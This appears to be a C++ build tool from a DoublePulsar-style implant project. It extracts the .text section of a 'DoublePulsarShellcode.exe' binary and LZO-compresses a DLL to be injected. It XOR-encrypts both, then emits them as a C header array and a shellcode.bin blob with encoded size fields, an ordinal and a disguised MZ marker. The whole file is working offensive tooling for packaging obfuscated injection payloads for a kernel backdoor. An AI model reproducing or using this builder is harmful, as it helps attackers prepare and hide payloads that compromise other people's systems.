// ExtractShellcode.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <iomanip>
#include <algorithm>
#include "..\Helper\Winapi.h"

#include <Windows.h>
#include "../Helper/tools.h"

//LZO1Z999 algorithm header file
#include "../../lzo-2.06/include/lzo/lzo1z.h"
//PE and LZO libraries linking directives
#ifndef _M_X64
#ifdef _DEBUG
#pragma comment(lib, "../Debug/lzo-2.06.lib")
#else
#pragma comment(lib, "../Release/lzo-2.06.lib")
#endif
#else
#ifdef _DEBUG
#pragma comment(lib, "../x64/Debug/lzo-2.06.lib")
#else
#pragma comment(lib, "../x64/Release/lzo-2.06.lib")
#endif
#endif

struct Param {
    int size;
    int posFunc1;
};

Param getShellcodeSize(const char* file)
{
    std::fstream mapfile;
    
    Param p;

    mapfile.open(file, std::ios::in); //open a file to perform read operation using file object
    if (mapfile.is_open()) {   //checking whether the file is open
        std::string tp;
        while (getline(mapfile, tp)) { //read data from file object and put it into string.

            std::size_t found = tp.find(" main ");
            if (found != std::string::npos)
            {
                std::cout << tp << std::endl;
                p.size = (int)strtol(tp.substr(6, 12).c_str(), NULL, 16);
            }

            found = tp.find(" lzo1z_decompress ");
            if (found != std::string::npos)
            {
                std::cout << tp << std::endl;
                p.posFunc1 = (int)strtol(tp.substr(6, 12).c_str(), NULL, 16);
            }
        }
        mapfile.close(); //close the file object.
    }

    return p;
}

void XOREncrypt(unsigned char* buf, byte key, int start, int end)
{
    for (int i = start; i < end; i++)
    {
        buf[i] = buf[i] ^ key;
    }
}

int main(int argc, const char* argv[])
{

    //Usage hints
    if (argc != 3)
    {
        std::cout << "Usage: ExtractShellcode.exe map_file.txt output.h" << std::endl;
        return 0;
    }

	LPCWSTR DllPath = L"DoublePulsarShellcode.exe";
	HANDLE hDll = CreateFile(DllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD FileSize = GetFileSize(hDll, NULL);

    LPCWSTR InjectedDllPath = L"MyMessageBox.dll";
	HANDLE InjectedhDll = CreateFile(InjectedDllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    DWORD InjectedFileSize = GetFileSize(InjectedhDll, NULL);

    // read the dll:
    DWORD lpInjectedNumberOfBytesRead = 0;
    unsigned char* InjectedFileBuffer = (unsigned char*)VirtualAlloc(NULL, InjectedFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ReadFile(InjectedhDll, InjectedFileBuffer, InjectedFileSize, &lpInjectedNumberOfBytesRead, NULL);

    DWORD lpNumberOfBytesRead = 0;
	unsigned char* FileBuffer = (unsigned char*)VirtualAlloc(NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ReadFile(hDll, FileBuffer, FileSize, &lpNumberOfBytesRead, NULL);

	PIMAGE_NT_HEADERS NTHeaders = GetNTHeaders((HMODULE)FileBuffer);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(NTHeaders);

    int base = 0, end = 0, size = 0;
    for (int i = 0; i < NTHeaders->FileHeader.NumberOfSections; i++, section++)
    {
        if (strcmp((char*)section->Name, ".text") == 0)
        {
            base = section->PointerToRawData;
        }
    }

    Param p = getShellcodeSize(argv[1]);

	size = p.size;
    end = base + size;

    std::cout << "Size of unencrypted content in bytes: " << p.posFunc1 << std::endl;

	DWORD lpPreviousInjectedNumberOfBytesRead = lpInjectedNumberOfBytesRead;

	{
		//Initialize LZO compression library
		if (lzo_init() != LZO_E_OK)
		{
			std::cout << "Error initializing LZO library" << std::endl;
			return -1;
		}

		std::unique_ptr<lzo_align_t> work_memory(new lzo_align_t[LZO1Z_999_MEM_COMPRESS]);

		//Unpacked data length
		lzo_uint src_length = lpInjectedNumberOfBytesRead;
		//Packed data length
		//(unknown yet)
		lzo_uint out_length = 0;

		//Reference to section raw data
		byte* out_buf = (byte*)malloc(src_length + src_length / 16 + 64 + 3);
		//out_buf.resize(src_length + src_length / 16 + 64 + 3);

		//Perform data compression
		std::cout << "Packing data..." << std::endl;
		if (LZO_E_OK !=
			lzo1z_999_compress((byte*)InjectedFileBuffer,
				src_length,
				out_buf,
				&out_length,
				work_memory.get())
			)
		{
			//If something goes wrong, exit
			std::cout << "Error compressing data!" << std::endl;
			return -1;
		}

		out_buf = (byte*)realloc(out_buf, out_length);

		std::cout << "Packing complete... Old size: " << src_length << " New size: " << out_length << std::endl;

		InjectedFileBuffer = out_buf;
		lpInjectedNumberOfBytesRead = out_length;
	}


	// Size of first part to decrypt 57 bytes
	XOREncrypt(FileBuffer, KEY_SHELLCODE, base + (byte)SHELLCODE_XOR_OFFSET, end);
    XOREncrypt(InjectedFileBuffer, KEY_DLL, 0, lpInjectedNumberOfBytesRead);

	std::ofstream bin(".\\shellcode.bin", std::ios::out | std::ios::trunc);

    //Оpen output .h file for writing
    //Its name is stored in argv[2]
    std::ofstream output_source(argv[2], std::ios::out | std::ios::trunc);

    //Start to generate the source code
    output_source << std::hex << "#pragma once" << std::endl << "unsigned char shellcode[] = {";
    //Total section data length
    std::string::size_type total_len = size + lpInjectedNumberOfBytesRead;

    output_source << "// Shellcode";
    for (int i = 0; base < end; base++, i++)
    {
      //Add line endings to
      //provide code readability 
        if ((i % 16) == 0)
            output_source << std::endl;

        //Write byte value
        output_source
            << "0x" << std::setw(2) << std::setfill('0')
            << static_cast<unsigned long>(static_cast<unsigned char>(FileBuffer[base]));

		bin << FileBuffer[base];

        //And a comma if needed
        if (i != total_len - 1)
            output_source << ", ";
    }

    
    union byteushort
    {
        byte b[sizeof byte];
        ushort i;
    };

    byteushort bi;
    bi.i = (ushort)size;
    printf("Shellcode size: %d (0x%x)\n", (ushort)size, (ushort)size);

    output_source << std::endl;
    output_source << "0x" << std::setw(2) << std::setfill('0') 
        << static_cast<unsigned long>(static_cast<unsigned char>(bi.b[0] ^ KEY_SHELLCODE)) << ", ";
    output_source << "0x" << std::setw(2) << std::setfill('0') 
        << static_cast<unsigned long>(static_cast<unsigned char>(bi.b[1] ^ KEY_SHELLCODE)) << ", ";
    output_source << "// Size of shellcode 0x" << std::hex << (ushort)size;

	bin << (bi.b[0] ^ KEY_SHELLCODE) << (bi.b[1] ^ KEY_SHELLCODE);

    output_source << std::endl;
    output_source << "0x" << std::setw(2) << std::setfill('0')
        << static_cast<unsigned long>(static_cast<unsigned char>(0 ^ KEY_SHELLCODE)) << ", ";
    output_source << "// Ordinal to call";

	bin << (0 ^ KEY_SHELLCODE);

	union byteuint
	{
		byte b[sizeof byte];
		uint i;
	};

	byteuint bidll;
    bidll.i= (uint)lpInjectedNumberOfBytesRead;
    printf("DLL file compressed size: %d (0x%08x)\n", (uint)lpInjectedNumberOfBytesRead, (uint)lpInjectedNumberOfBytesRead);
    output_source << std::endl;
    output_source << "0x" << std::setw(2) << std::setfill('0')
        << static_cast<unsigned long>(static_cast<unsigned char>(bidll.b[0] ^ KEY_SHELLCODE)) << ", ";
    output_source << "0x" << std::setw(2) << std::setfill('0')
        << static_cast<unsigned long>(static_cast<unsigned char>(bidll.b[1] ^ KEY_SHELLCODE)) << ", ";
	output_source << "0x" << std::setw(2) << std::setfill('0')
		<< static_cast<unsigned long>(static_cast<unsigned char>(bidll.b[2] ^ KEY_SHELLCODE)) << ", ";
	output_source << "0x" << std::setw(2) << std::setfill('0')
		<< static_cast<unsigned long>(static_cast<unsigned char>(bidll.b[3] ^ KEY_SHELLCODE)) << ", ";
    output_source << "// Size of DLL file 0x" << std::hex << (uint)lpInjectedNumberOfBytesRead;

	bin << (bidll.b[0] ^ KEY_SHELLCODE) << (bidll.b[1] ^ KEY_SHELLCODE) << (bidll.b[2] ^ KEY_SHELLCODE) << (bidll.b[3] ^ KEY_SHELLCODE);

	//byteuint bidll;
	bidll.i = (uint)lpPreviousInjectedNumberOfBytesRead;
	printf("DLL file size: %d (0x%08x)\n", (uint)lpPreviousInjectedNumberOfBytesRead, (uint)lpPreviousInjectedNumberOfBytesRead);
	output_source << std::endl;
	output_source << "0x" << std::setw(2) << std::setfill('0')
		<< static_cast<unsigned long>(static_cast<unsigned char>(bidll.b[0] ^ KEY_SHELLCODE)) << ", ";
	output_source << "0x" << std::setw(2) << std::setfill('0')
		<< static_cast<unsigned long>(static_cast<unsigned char>(bidll.b[1] ^ KEY_SHELLCODE)) << ", ";
	output_source << "0x" << std::setw(2) << std::setfill('0')
		<< static_cast<unsigned long>(static_cast<unsigned char>(bidll.b[2] ^ KEY_SHELLCODE)) << ", ";
	output_source << "0x" << std::setw(2) << std::setfill('0')
		<< static_cast<unsigned long>(static_cast<unsigned char>(bidll.b[3] ^ KEY_SHELLCODE)) << ", ";
	output_source << "// Size of DLL file 0x" << std::hex << (uint)lpPreviousInjectedNumberOfBytesRead;

	bin << (bidll.b[0] ^ KEY_SHELLCODE) << (bidll.b[1] ^ KEY_SHELLCODE) << (bidll.b[2] ^ KEY_SHELLCODE) << (bidll.b[3] ^ KEY_SHELLCODE);

    output_source << std::endl;
    output_source << "// DLL to inject";
	output_source << std::endl;

	// Write MZ flag even though it's compressed
	std::cout << "Flag is x" << std::hex << ('M' ^ KEY_DLL) << "x" << std::hex << ('Z' ^ KEY_DLL) << std::endl;
	output_source
		<< "0x" << std::setw(2) << std::setfill('0')
		<< static_cast<unsigned long>(static_cast<unsigned char>('M' ^ KEY_DLL));
	output_source << ", ";
	output_source
		<< "0x" << std::setw(2) << std::setfill('0')
		<< static_cast<unsigned long>(static_cast<unsigned char>('Z' ^ KEY_DLL));
	output_source << ", ";

	bin << ('M' ^ KEY_DLL) << ('Z' ^ KEY_DLL);

    for (int i = 0; i < lpInjectedNumberOfBytesRead; i++)
    {
        //Add line endings to
        //provide code readability 
        if ((i % 16) == 0)
            output_source << std::endl;

        //Write byte value
        output_source
            << "0x" << std::setw(2) << std::setfill('0')
            << static_cast<unsigned long>(static_cast<unsigned char>(InjectedFileBuffer[i]));
		bin << InjectedFileBuffer[i];

        //And a comma if needed
        if (i != total_len - 1)
            output_source << ", ";
    }

    //End of code
    output_source << " };" << std::endl;

	bin.close();
	output_source.close();

	return 0;
}